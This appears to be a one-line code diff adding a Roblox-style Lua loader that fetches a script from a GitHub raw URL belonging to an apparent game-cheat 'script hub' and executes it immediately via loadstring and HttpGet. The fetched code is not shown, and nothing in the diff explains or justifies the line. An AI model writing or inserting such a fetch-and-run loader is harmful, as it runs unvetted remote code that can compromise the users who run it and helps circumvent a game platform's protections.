@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SyrTop/GenesisReborn/main/Alpha/77_25FKQBAWPV9R3.lua"))()
